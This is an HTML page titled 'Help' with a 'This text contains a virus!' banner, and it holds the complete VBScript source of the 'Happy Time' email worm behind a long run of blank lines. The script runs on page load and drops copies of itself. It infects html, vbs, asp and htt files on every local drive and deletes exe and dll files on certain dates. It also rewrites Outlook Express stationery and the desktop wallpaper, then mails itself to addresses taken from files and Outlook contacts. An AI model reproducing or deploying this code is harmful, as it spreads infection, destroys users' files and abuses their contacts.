<x-html>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Help</TITLE>
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type><BASE 
href=file://C:\WINDOWS\>
<META content="MSHTML 5.00.2614.3500" name=GENERATOR>
<STYLE></STYLE>

<META content="MSHTML 5.00.2614.3500" name=GENERATOR>
<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
<BODY bgColor=#ffffff>
<DIV>
<DIV><FONT face=Arial size=2>
This text contains a virus!
</FONT></DIV>
<DIV>
<SCRIPT language=VBScript>

















































Rem I am sorry! happy time
On Error Resume Next
mload
Sub mload()
On Error Resume Next
mPath = Grf()
Set Os = CreateObject("Scriptlet.TypeLib")
Set Oh = CreateObject("Shell.Application")
If IsHTML Then
mURL = LCase(document.Location)
If mPath = "" Then
Os.Reset
Os.Path = "C:\Help.htm"
Os.Doc = Lhtml()
Os.Write()
Ihtml = "<span style='position:absolute'><Iframe src='C:\Help.htm' width='0' height='0'></Iframe></span>"
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)
Else
If Iv(mPath, "Help.vbs") Then
setInterval "Rt()", 10000
Else
m = "hta"
If LCase(m) = Right(mURL, Len(m)) Then
id = setTimeout("mclose()", 1)
main
Else
Os.Reset()
Os.Path = mPath & "\" & "Help.hta"
Os.Doc = Lhtml()
Os.write()
Iv mPath, "Help.hta"
End If
End If
End If
Else
main
End If
End Sub
Sub main()
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
Set Od = CreateObject("Scripting.Dictionary")
Od.Add "html", "1100"
Od.Add "vbs", "0100"
Od.Add "htm", "1100"
Od.Add "asp", "0010"
Ks = "HKEY_CURRENT_USER\Software\"
Ds = Grf()
Cs = Gsf()
If IsVbs Then
If Of.FileExists("C:\help.htm") Then
Of.DeleteFile ("C:\help.htm")
End If
Key = CInt(Month(Date) + Day(Date))
If Key = 13 Then
Od.RemoveAll
Od.Add "exe", "0001"
Od.Add "dll", "0001"
End If
Cn = Rg(Ks & "Help\Count")
If Cn = "" Then
Cn = 1
End If
Rw Ks & "Help\Count", Cn + 1
f1 = Rg(Ks & "Help\FileName")
f2 = FNext(Of, Od, f1)
fext = GetExt(Of, Od, f2)
Rw Ks & "Help\FileName", f2
If IsDel(fext) Then
f3 = f2
f2 = FNext(Of, Od, f2)
Rw Ks & "Help\FileName", f2
Of.DeleteFile f3
Else
If LCase(WScript.ScriptFullname) <> LCase(f2) Then
Fw Of, f2, fext
End If
End If
If (CInt(Cn) Mod 366) = 0 Then
If (CInt(Second(Time)) Mod 2) = 0 Then
Tsend
Else
adds = Og
Msend (adds)
End If
End If
wp = Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")
If Rg(Ks & "Help\wallPaper") <> wp Or wp = "" Then
If wp = "" Then
n1 = ""
n3 = Cs & "\Help.htm"
Else
mP = Of.GetFile(wp).ParentFolder
n1 = Of.GetFileName(wp)
n2 = Of.GetBaseName(wp)
n3 = Cs & "\" & n2 & ".htm"
End If
Set pfc = Of.CreateTextFile(n3, True)
mt = Sa("1100")
pfc.Write "<" & "HTML><" & "body bgcolor='#007f7f' background='" & n1 & "'><" & "/Body><" & "/HTML>" & mt
pfc.Close
Rw Ks & "Help\wallPaper", n3
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3
End If
Else
Set fc = Of.CreateTextFile(Ds & "\Help.vbs", True)
fc.Write Sa("0100")
fc.Close
bf = Cs & "\Untitled.htm"
Set fc2 = Of.CreateTextFile(bf, True)
fc2.Write Lhtml
fc2.Close
oeid = Rg("HKEY_CURRENT_USER\Identities\Default User ID")
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
MSH = oe & "\Message Send HTML"
CUS = oe & "\Compose Use Stationery"
SN = oe & "\Stationery Name"
Rw MSH, 1
Rw CUS, 1
Rw SN, bf
Web = Cs & "\WEB"
Set gf = Of.GetFolder(Web).Files
Od.Add "htt", "1100"
For Each m In gf
fext = GetExt(Of, Od, m)
If fext <> "" Then
Fw Of, m, fext
End If
Next
End If
End Sub
Sub mclose()
document.Write "<" & "title>I am sorry!</title" & ">"
window.Close
End Sub
Sub Rt()
Dim mPath
On Error Resume Next
mPath = Grf()
Iv mPath, "Help.vbs"
End Sub
Function Sa(n)
Dim VBSText, m
VBSText = Lvbs()
If Mid(n, 3, 1) = 1 Then
m = "<%" & VBSText & "%>"
End If
If Mid(n, 2, 1) = 1 Then
m = VBSText
End If
If Mid(n, 1, 1) = 1 Then
m = Lscript(m)
End If
Sa = m & vbCrLf
End Function
Sub Fw(Of, S, n)
Dim fc, fc2, m, mmail, mt
On Error Resume Next
Set fc = Of.OpenTextFile(S, 1)
mt = fc.ReadAll
fc.Close
If Not Sc(mt) Then
mmail = Ml(mt)
mt = Sa(n)
Set fc2 = Of.OpenTextFile(S, 8)
fc2.Write mt
fc2.Close
Msend (mmail)
End If
End Sub
Function Sc(S)
mN = "Rem I am sorry! happy time"
If InStr(S, mN) > 0 Then
Sc = True
Else
Sc = False
End If
End Function
Function FNext(Of, Od, S)
Dim fpath, fname, fext, T, gf
On Error Resume Next
fname = ""
T = False
If Of.FileExists(S) Then
fpath = Of.GetFile(S).ParentFolder
fname = S
ElseIf Of.FolderExists(S) Then
fpath = S
T = True
Else
fpath = Dnext(Of, "")
End If
Do While True
Set gf = Of.GetFolder(fpath).Files
For Each m In gf
If T Then
If GetExt(Of, Od, m) <> "" Then
FNext = m
Exit Function
End If
ElseIf LCase(m) = LCase(fname) Or fname = "" Then
T = True
End If
Next
fpath = Pnext(Of, fpath)
Loop
End Function
Function Pnext(Of, S)
On Error Resume Next
Dim Ppath, Npath, gp, pn, T, m
T = False
If Of.FolderExists(S) Then
Set gp = Of.GetFolder(S).SubFolders
pn = gp.Count
If pn = 0 Then
Ppath = LCase(S)
Npath = LCase(Of.GetParentFolderName(S))
T = True
Else
Npath = LCase(S)
End If
Do While Not Er
For Each pn In Of.GetFolder(Npath).SubFolders
If T Then
If Ppath = LCase(pn) Then
T = False
End If
Else
Pnext = LCase(pn)
Exit Function
End If
Next
T = True
Ppath = LCase(Npath)
Npath = Of.GetParentFolderName(Npath)
If Of.GetFolder(Ppath).IsRootFolder Then
m = Of.GetDriveName(Ppath)
Pnext = Dnext(Of, m)
Exit Function
End If
Loop
End If
End Function
Function Dnext(Of, S)
Dim dc, n, d, T, m
On Error Resume Next
T = False
m = ""
Set dc = Of.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If T Then
Dnext = d
Exit Function
Else
If LCase(S) = LCase(d) Then
T = True
End If
If m = "" Then
m = d
End If
End If
End If
Next
Dnext = m
End Function
Function GetExt(Of, Od, S)
Dim fext
On Error Resume Next
fext = LCase(Of.GetExtensionName(S))
GetExt = Od.Item(fext)
End Function
Sub Rw(k, v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
R.RegWrite k, v
End Sub
Function Rg(v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
Rg = R.RegRead(v)
End Function
Function IsVbs()
Dim ErrTest
On Error Resume Next
ErrTest = WScript.ScriptFullname
If Err Then
IsVbs = False
Else
IsVbs = True
End If
End Function
Function IsHTML()
Dim ErrTest
On Error Resume Next
ErrTest = document.Location
If Er Then
IsHTML = False
Else
IsHTML = True
End If
End Function
Function IsMail(S)
Dim m1, m2
IsMail = False
If InStr(S, vbCrLf) = 0 Then
m1 = InStr(S, "@")
m2 = InStr(S, ".")
If m1 <> 0 And m1 < m2 Then
IsMail = True
End If
End If
End Function
Function Lvbs()
Dim f, m, ws, Of
On Error Resume Next
If IsVbs Then
Set Of = CreateObject("Scripting.FileSystemObject")
Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)
Lvbs = f.ReadAll
Else
For Each ws In document.scripts
If LCase(ws.Language) = "vbscript" Then
If Sc(ws.Text) Then
Lvbs = ws.Text
Exit Function
End If
End If
Next
End If
End Function
Function Iv(mPath, mName)
Dim Shell
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb
If Er Then
Iv = False
Else
Iv = True
End If
End Function
Function Grf()
Dim Shell, mPath
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
mPath = "C:\"
For Each mShell In Shell.NameSpace(mPath).Items
If mShell.IsFolder Then
Grf = mShell.Path
Exit Function
End If
Next
If Er Then
Grf = ""
End If
End Function
Function Gsf()
Dim Of, m
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
m = Of.GetSpecialFolder(0)
If Er Then
Gsf = "C:\"
Else
Gsf = m
End If
End Function
Function Lhtml()
Lhtml = "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _
"<" & "Title> Help </Title" & "><" & "/HEAD>" & vbCrLf & _
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _
"<" & "/Body></HTML" & ">"
End Function
Function Lscript(S)
Lscript = "<" & "script language='VBScript'>" & vbCrLf & _
S & "<" & "/script" & ">"
End Function
Function Sl(S1, S2, n)
Dim l1, l2, l3, i
l1 = Len(S1)
l2 = Len(S2)
i = InStr(S1, S2)
If i > 0 Then
l3 = i + l2 - 1
If n = 0 Then
Sl = Left(S1, i - 1)
ElseIf n = 1 Then
Sl = Right(S1, l1 - l3)
End If
Else
Sl = ""
End If
End Function
Function Ml(S)
Dim S1, S3, S2, T, adds, m
S1 = S
S3 = """"
adds = ""
S2 = S3 & "mailto" & ":"
T = True
Do While T
S1 = Sl(S1, S2, 1)
If S1 = "" Then
T = False
Else
m = Sl(S1, S3, 0)
If IsMail(m) Then
adds = adds & m & vbCrLf
End If
End If
Loop
Ml = Split(adds, vbCrLf)
End Function
Function Og()
Dim i, n, m(), Om, Oo
Set Oo = CreateObject("Outlook.Application")
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items
n = Om.Count
ReDim m(n)
For i = 1 To n
m(i - 1) = Om.Item(i).Email1Address
Next
Og = m
End Function
Sub Tsend()
Dim Od, MS, MM, a, m
Set Od = CreateObject("Scripting.Dictionary")
MConnect MS, MM
MM.FetchSorted = True
MM.Fetch
For i = 0 To MM.MsgCount - 1
MM.MsgIndex = i
a = MM.MsgOrigAddress
If Od.Item(a) = "" Then
Od.Item(a) = MM.MsgSubject
End If
Next
For Each m In Od.Keys
MM.Compose
MM.MsgSubject = "Fw: " & Od.Item(m)
MM.RecipAddress = m
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
Next
MS.SignOff
End Sub
Function MConnect(MS, MM)
Dim U
On Error Resume Next
Set MS = CreateObject("MSMAPI.MAPISession")
Set MM = CreateObject("MSMAPI.MAPIMessages")
U = Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile")
MS.UserName = U
MS.DownLoadMail = False
MS.NewSession = False
MS.LogonUI = True
MS.SignOn
MM.SessionID = MS.SessionID
End Function
Sub Msend(Address)
Dim MS, MM, i, a
MConnect MS, MM
i = 0
MM.Compose
For Each a In Address
If IsMail(a) Then
MM.RecipIndex = i
MM.RecipAddress = a
i = i + 1
End If
Next
MM.MsgSubject = " Help "
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
MS.SignOff
End Sub
Function Er()
If Err.Number = 0 Then
Er = False
Else
Err.Clear
Er = True
End If
End Function
Function IsDel(S)
If Mid(S, 4, 1) = 1 Then
IsDel = True
Else
IsDel = False
End If
End Function


</SCRIPT>
</DIV></DIV></BODY></HTML>

</x-html>
